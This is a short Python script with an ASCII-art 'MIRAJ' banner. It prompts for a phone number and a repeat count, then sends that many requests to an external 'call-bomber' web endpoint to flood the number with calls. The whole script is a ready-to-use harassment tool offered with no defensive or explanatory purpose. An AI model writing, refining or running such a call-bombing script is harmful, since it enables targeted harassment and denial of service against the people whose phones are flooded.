logo ="""\033[1;96m
___  ______________  ___     ___ 
|  \/  |_   _| ___ \/ _ \   |_  |
| .  . | | | | |_/ / /_\ \    | |
| |\/| | | | |    /|  _  |    | |
| |  | |_| |_| |\ \| | | |/\__/ /
\_|  |_/\___/\_| \_\_| |_/\____/ 

                                             """

import requests
number = input("Enter Your Number: ")
amount = int(input ("Enter Your Amount: "))
for i in range (amount):
 r= requests.get("http://pikachu-call-bomber.ezyro.com/babyyy.php?phone="+number)
 f= r.content
 print(f)
